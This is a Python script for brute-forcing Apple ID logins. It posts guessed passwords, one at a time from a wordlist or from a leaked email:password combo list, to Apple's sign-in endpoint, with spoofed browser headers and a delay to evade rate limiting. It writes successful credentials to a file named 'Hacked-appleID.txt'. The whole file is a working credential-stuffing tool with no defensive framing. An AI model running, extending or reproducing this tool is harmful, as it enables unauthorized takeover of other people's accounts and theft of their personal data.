import requests
from threading import Lock
from time import sleep
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Constants
URL = 'https://idmsa.apple.com/appleauth/auth/signin'
HEADERS = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "X-Apple-Locale": "QT-EN",
    "X-Apple-Trusted-Domain": "https://idmsa.apple.com",
    "Origin": "https://idmsa.apple.com",
    "X-Requested-With": "XMLHttpRequest"
}
PASSWORD_CORRECT_MESSAGE = 'authType'
CLOSED_ACCOUNT_MESSAGE = 'This Apple ID has been locked for security reasons.'
PASSWORD_INCORRECT_MESSAGE = 'Your Apple ID or password was incorrect.'

# Lock for thread safety
lock = Lock()


class AppleIDChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(HEADERS)

    def check_single_target(self, apple_id, password_list):
        with open(password_list, 'r') as file:
            for password in file:
                password = password.strip()
                if not password:
                    break
                self.try_login(apple_id, password)
                sleep(1)  # Sleep to prevent rate limiting

    def check_combo_list(self, combo_list_file):
        with open(combo_list_file, 'r') as file:
            for line in file:
                apple_id, _, password = line.strip().partition(":")
                self.try_login(apple_id, password)
                sleep(1)  # Sleep to prevent rate limiting

    def try_login(self, apple_id, password):
        response = self.session.post(URL, json={"accountName": apple_id, "password": password, "rememberMe": False})
        self.process_response(apple_id, password, response.text)

    def process_response(self, apple_id, password, response_text):
        print(response_text)
        if PASSWORD_CORRECT_MESSAGE in response_text:
            logger.info(f'Password Correct appleID-> {apple_id}:{password}')
            self.save_result('Hacked-appleID.txt', apple_id, password)
        elif PASSWORD_INCORRECT_MESSAGE in response_text:
            logger.info(f'Password Incorrect appleID-> {apple_id}:{password}')
            self.save_result('Password-incorrect-appleID.txt', apple_id, password)
        elif CLOSED_ACCOUNT_MESSAGE in response_text:
            logger.info(f'Closed appleID-> {apple_id}:{password}')
            self.save_result('Closed-appleID.txt', apple_id, password)
        else:
            logger.error(f'ERROR-> {apple_id}:{password}')

    def save_result(self, file_name, apple_id, password):
        with lock, open(file_name, 'a') as file:
            file.write(f'{apple_id}:{password}\n')


def main():
    checker = AppleIDChecker()
    mode = input('[?] MODES : \n1- Target Apple ID (File pass)\n2- ComboList Apple ID (email:pass)\n99- Exit() ..\n[@] Choose : ')
    if mode == '1':
        apple_id = input('[$] Enter apple ID : ')
        password_file = input('[¿] Enter the password file name: ')
        checker.check_single_target(apple_id, password_file)
    elif mode == '2':
        combo_list_file = input('[+] Enter the name of the combo appleID file: ')
        checker.check_combo_list(combo_list_file)
    elif mode == '99':
        logger.info('Exiting...')


if __name__ == '__main__':
    main()
